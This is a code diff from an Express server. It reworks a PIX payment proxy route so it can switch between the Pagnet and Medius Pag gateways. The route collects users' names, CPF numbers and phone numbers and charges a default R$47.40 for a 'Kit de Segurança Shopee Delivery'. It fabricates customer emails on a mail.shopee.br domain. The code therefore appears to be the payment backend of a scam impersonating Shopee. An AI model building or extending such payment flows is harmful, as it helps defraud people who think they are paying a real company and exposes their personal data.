@@ -742,18 +742,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // Rota proxy para Pagnet API para evitar CORS
+  // Rota proxy para PIX com sistema duplo de gateways (Pagnet + Medius Pag)
   app.post('/api/proxy/for4payments/pix', async (req, res) => {
     try {
-      // Verificar se a API Pagnet está configurada
-      if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
-        console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas');
-        return res.status(500).json({
-          error: 'Serviço de pagamento não configurado. Configure as chaves de API Pagnet.',
-        });
-      }
+      // Verificar qual gateway usar baseado na variável de ambiente
+      const gatewayChoice = process.env.GATEWAY_CHOICE || 'PAGNET';
       
-      console.log('Iniciando proxy para Pagnet...');
+      console.log(`[GATEWAY] Usando gateway: ${gatewayChoice}`);
       
       // Processar os dados recebidos
       const { name, cpf, email, phone, amount = 47.40, description = "Kit de Segurança Shopee Delivery" } = req.body;
@@ -765,28 +760,79 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Gerar email se não tiver sido fornecido
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
-      console.log('Enviando requisição para Pagnet API via proxy...', {
-        name: name,
-        cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`
-      });
+      let result: any = null;
       
-      // Importar e usar a API Pagnet
-      const { createPagnetAPI } = await import('./pagnet-api');
-      const pagnetAPI = createPagnetAPI();
+      if (gatewayChoice === 'MEDIUS_PAG') {
+        // Usar Medius Pag
+        if (!process.env.MEDIUS_PAG_SECRET_KEY) {
+          console.error('ERRO: MEDIUS_PAG_SECRET_KEY não configurada');
+          return res.status(500).json({
+            error: 'Gateway Medius Pag não configurado. Configure a chave secreta.',
+          });
+        }
+        
+        console.log('Iniciando proxy para Medius Pag...');
+        console.log('Enviando requisição para Medius Pag API via proxy...', {
+          name: name,
+          cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`
+        });
+        
+        // Importar e usar a API Medius Pag
+        const { MediusPagAPI } = await import('./medius-api');
+        const mediusAPI = new MediusPagAPI(process.env.MEDIUS_PAG_SECRET_KEY);
+        
+        // Criar transação PIX usando Medius Pag
+        const mediusResult = await mediusAPI.createPixTransaction({
+          customer_name: name,
+          customer_email: userEmail,
+          customer_cpf: cpf,
+          customer_phone: phone,
+          amount: amount,
+          description: description
+        });
+        
+        // Converter resposta da Medius Pag para formato compatível
+        result = {
+          success: true,
+          transaction_id: mediusResult.id,
+          pix_code: mediusResult.pixCode,
+          status: mediusResult.status,
+          emailSent: false
+        };
+        
+      } else {
+        // Usar Pagnet (padrão)
+        if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
+          console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas');
+          return res.status(500).json({
+            error: 'Gateway Pagnet não configurado. Configure as chaves de API Pagnet.',
+          });
+        }
+        
+        console.log('Iniciando proxy para Pagnet...');
+        console.log('Enviando requisição para Pagnet API via proxy...', {
+          name: name,
+          cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`
+        });
+        
+        // Importar e usar a API Pagnet
+        const { createPagnetAPI } = await import('./pagnet-api');
+        const pagnetAPI = createPagnetAPI();
+        
+        // Criar transação PIX usando Pagnet
+        result = await pagnetAPI.createPixTransaction(
+          {
+            nome: name,
+            cpf: cpf,
+            email: userEmail,
+            phone: phone
+          },
+          amount,
+          phone
+        );
+      }
       
-      // Criar transação PIX usando Pagnet
-      const result = await pagnetAPI.createPixTransaction(
-        {
-          nome: name,
-          cpf: cpf,
-          email: userEmail,
-          phone: phone
-        },
-        amount,
-        phone
-      );
-      
-      console.log('Resposta da Pagnet recebida pelo proxy');
+      console.log(`Resposta do gateway ${gatewayChoice} recebida pelo proxy`);
       
       // Se a resposta foi bem-sucedida e temos os dados do PIX, enviar email
       if (result.success && result.pix_code) {
